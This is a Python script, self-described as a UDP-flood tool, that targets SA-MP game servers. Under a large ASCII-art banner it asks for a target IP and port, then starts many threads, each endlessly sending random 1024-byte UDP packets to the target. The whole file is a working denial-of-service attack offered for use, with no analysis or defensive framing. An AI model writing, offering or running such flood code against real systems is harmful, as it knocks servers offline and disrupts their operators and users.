# SXMP - A UDP-Flood script that made on purpose.
# Launches a attack to the SAMP connection client.
import random
import socket
import threading
print("""
  o++++:.``.......`   ..  ``         ````  ```` `.` `    `...`     ``````````.-//:--.```./+++++++++++s
+++++:-/+++++++++/-``.:.`-.``--.    ````  ``                 ``      `             .:/+++o+oo+++++++
++++++//::---.`````   `.` `` ```      ```   ``     ``..`  `...`````` `     `.--...`  `.:++++oo+o++++
++/:..``.. `    ``        `.-`         `` `---.` `.----..---:------.`..```   `.....-..` ``-/++++++o+
++..-//-.`  ``````      ``  `    ``..``-.``----``-------------::::-.``````                 ``-/++ooo
++//+++/.      `     ``  `    ``.--------------`.---------------:---------..``         `  ``` `.:+++
++++++/:`    ```   .-``     ``.-----------------------------------::--:::::::---.`     `.-://-` `/++
+++++/.           ``     ``.----:---------------------------...----.----------:::-` `.`   `.:+//++++
+//:-`     `.``        ``.---------.` ``...--..-------------...---..----.....-::---` .:`   ``/++++++
.``       ..` `      `.-------.`.-````..--------------------------------------:---:-  `.-` ./+oo++o+
 `.-:`   ``          .-::-``..`.-------:-----------------------------::---:::::-.``.``` `-. ./+ooooo
:/++-           `   `..-:-----:---::--:-::---------------:--------::----:-:::::::--.``.`  ``  -+oooo
++++.`.            ``.-::::::::::::::::----:-------------::-::-::::/++++++++::::::::-.`       `.+ooo
+++/-`         ``  .-::-::::::///+ydddddhys+/::-----:-:-:::/oyddNNmmdyyyyhNNmdo//:::::.`     `:.`/oo
+/-`    `     ``  `.-.-::::ohmNNdhhdhso+sNMssddys::::::oymNNs+:.yNs::::::/mo.:yNNd/:::.       `-.`:+
-`    ``     ````````.-:ohdy/-+N+::::::::sN:`.hNy:::/ymNmNMNy. .dd/::::::sd-`-/mddo:::` ..      ```:
`. ` `-       `:. ``-:smNMh`  `sh/::::::/yNhyhh+::-:/so/:/ymNms/hNs::::/smy+hhy+:::::-.``-:.    ``-/
.``:.::`      .``.-::sdyoyms:.`:mmh+:/+odNmhs+:::::::::::::/+sdNmmmhhyshNNmyo:::::::::::` .::`  `-.`
. -+/+/`        .---::::::/osyssdmmdhddhyo/::::::::+/::::::::::////+ossso+/::::::::::::::` `.-`  .:-
.`/++:`         ```---:::::::://///////:::::::::::/md+:::::::::::::::::::::::::::::::::::`   `:` `:+
-`:+:`      `    `-.`.:::::::::::::::::::::::::::::+dmo:::::::::::::::::::::::::::::::::/-  ` ``  ./
/:/:```    ``   `--``-::::::::::::::::::::::::::::::+mm/:::::::::::::::::::::::::::::::::/. ..     .
++/.`:`    `   `--``-::::::::::::::::::::::::::::::::sNy::::::::::::::::::::::::::::::-`.::  .    ` 
+:` ./         .-``-:::::::::::::::::::::::::::::::::yNy:::::::::::::::::::::::::::::::-.``   `   --
/`  :/        `-``-:::::::::::::::::::::::::::::::::/dh::::::::::::::::::::::::::::::::::.`   `` ``/
`  ./-        .` .-::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.     .   :
 -`./.     `--.   .:::::::::::::::::::::::::::::::::::::::--::::::::::::::::::::::::::::::-`   .-.`.
`/:/:`   ` `:-`  `-::::::::::::::::::::::::::-.`---..::--.````.:.`.---:::::::::::::::::::::.    :/. 
.///.   `` .:.   .::::::::::::::::::::::::..-`  ``  .:::-`  ```--...---::::::::::::::::::::.    `.` 
:-`-`   .``-- ` `:::::::::::::::::::::``-.  `    `. .::::-.`.:--:-````--:::::::::::::::::::-        
:```   `. `-`   .::::::::::::::::::::-` `` ```...--.-::::::--::::::--``-::::::::::::::::::-`   `    
. .  ` .` ..  ``-::::::::::::::::::::-...`--:::::::::::::::::::::::::..-::::::::::::::::::-``  .. ` 
``. `.`-` ..   `::::::::::::::::::::::-`-://////+oooooooooshsoo+oy+:::-`.-::::::::::::--`.:+/`  ..- 
 -- `-``  `.   .::::::::::::::::::::::-`-/dmmdhmmmdddhyyyyyyyyhdmNm+:::.`.::::::::::::.  `-+/.  `-:`
`::--. `  ``   ---::::::::::::::::::-..`-+NNy/:///::::::::::::::/ody::::..::::::::::::``--:-..    -.
-///:````.    ./----::::::::::::::::-```-+so::::::::/++++/::::::::::::::..:::::::::::-..-//: `    -:
////.   --    -oo/.`.--::-:::::::::-`...-::::::::::/dNNNNd+::::::::::::-.-::::::-...`--`.//: `    `/
///:`  .::`   ./+:.//-``-:-`.:::::::-``.::::::::::::++++//:::::::::::::.`.:::::.``.-```.`-:` .    `/
///:`  .-`   -:/+shddyo//:.-::-..::::`.:::::::::::::::::::::::::::::::::. ``-:. .oyhs//- .-  `    `:
///-  `   . `oyddmmmmmmhho/:/:-..``:.`.:::-::--::::::::::::::::::::--::--.`.`-/+ydmmmds- `.         
///-     .- `smmmmmmmmmmmmmyso:-..:.`.-.```--.-::--:::::::.-:-::--. ````:o+syhdmmmmmmmd:           `
///. `   --  +mmmmmmmmmmmmmds///++o++/.----.++++-` `..--.```. .` .//++/+hdmmmmmmmmmmmmh`           -
///`.-`. ``  +mmmmmmmmmmmmmmy:--::://////soo+.:/...-..` .+/`-:::--++//+hmmmmmmmmmmmmmm+`-          -
///`.../ -- `/dmmmmmmmmmmmmmd+.``..--:hmmdhs+::////osysohds::/:::--../ymmmmmmmmmmmmmmd--/          .
/+o-` +o`.s+ydmmmmmmmmmmmmmmmh:``````.ymmmmmdyo++shdmmmmmd+--...```./hmmmmmmmmmmmmmmmy`oo   :-   `  
+ydhs./d:`ymmmmmmmmmmmmmmmmmmmy-``````sdmmmmmmdddmmmmmmmmy-```````-sdmmmmmmmmmmmmmmmmdshy`` s/  -s- 
hmmmmddmo`smmmmmmmmmmmmmmmmmmmms-```.-odddddhys++shddmmmd+-.````.+hmmmmmmmmmmmmmmmmmmmmm/`/`s/  :do 
mmmmmmmmh.:mmmmmmmmmmmmmmmmmmmmdo....`-yys+:-.````-:+yhdy-`.-..:sdmmmmmmmmmmmmmmmmmmmmmd`/s`s/  :mh`
mmmmmmmmm-.dNmmmmmmmmmmmmmmmmmmmds-````..````````````.-::````:sdmmmmmmmmmmmmmmmmmmmmmmms.ss`s/  :md-
mmmmmmmmms`+mmmmmmmmmmmmmmmmmmmmmds.```````````````````````./hmmmmmmmmmmmmmmmmmmmmmmmmmddm+`s+ .`ym+
mmmmmmmmmdo+hmmmmmmmmmmmmmmmmmmmmmms-````````````````````./ydmmmmmmmmmmmmmmmmmmmmmmmmmmmmm--mo`-`+my
mmmmmmmmmNmmmmmmmmmmmmmmmmmmmmmmmmmmh:.````````````````./ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm--md`:-.hm


                                                                       
""")

ip = str(input("> SERVER IP : "))
port = int(input(">  SERVER PORT : "))
times = int(input("> CONNECTIONS PACKET : "))
threads = int(input("> PACKETS : "))

# Attack
def sxmp():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"KUDANILMAN <3 KISSING TO IP {ip} AND TO PORT {port}")
		except:
			print(f"J3MBOETOES <3 KISSING TO IP {ip} AND TO PORT {port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = sxmp)
	th.start()
